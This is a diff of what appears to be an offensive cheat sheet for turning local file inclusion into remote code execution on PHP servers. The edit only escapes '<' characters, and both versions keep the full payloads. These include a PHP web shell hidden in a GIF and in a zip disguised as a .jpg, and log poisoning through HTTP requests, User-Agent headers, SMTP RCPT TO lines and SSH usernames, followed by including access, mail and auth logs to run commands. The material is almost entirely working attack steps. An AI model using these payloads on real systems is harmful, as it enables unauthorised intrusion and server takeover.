@@ -561,13 +561,13 @@ preg_match('/^\.\/okay\/.+$/', $_GET['file'])
 
 -> gif
 
-echo 'GIF8<?php system($_GET["cmd"]); ?>' > ok.gif
+echo 'GIF8\<?php system($_GET["cmd"]); ?>' > ok.gif
 
 /codes/lfi/ok.gif
 
 -> Zip
 
-1- echo '<?php system($_GET["cmd"]); ?>' > ok.php && zip ok.jpg ok.php
+1- echo '\<?php system($_GET["cmd"]); ?>' > ok.php && zip ok.jpg ok.php
 
 2- http://ip/index.php?file=zip://./uploads/ok.jpg%23ok.php&cmd=id
 
@@ -579,11 +579,11 @@ echo 'GIF8<?php system($_GET["cmd"]); ?>' > ok.gif
 
 nc ip 80
   
-<?php system($_GET[‘cmd’]); ?>  
+\<?php system($_GET[‘cmd’]); ?>  
   
 or
   
-curl http://ip/index.php -A '<?php system($_GET[‘cmd’]); ?>'
+curl http://ip/index.php -A '\<?php system($_GET[‘cmd’]); ?>'
   
 http://ip/index.php?file=/var/log/apache2/access.log&cmd=id
   
@@ -593,13 +593,13 @@ telnet ip 23
   
 MAIL FROM: email@gmail.com
   
-RCPT TO: <?php system($_GET[‘cmd’]); ?>
+RCPT TO: \<?php system($_GET[‘cmd’]); ?>
   
 http://ip/index.php?file=/var/mail/mail.log&cmd=id
   
 -> ssh
   
-ssh ‘<?php system($_GET[‘cmd’]);?>’@ip
+ssh \‘<?php system($_GET[‘cmd’]);?>’@ip
   
 http://ip/index.php?file=/var/log/auth.log&cmd=id
   
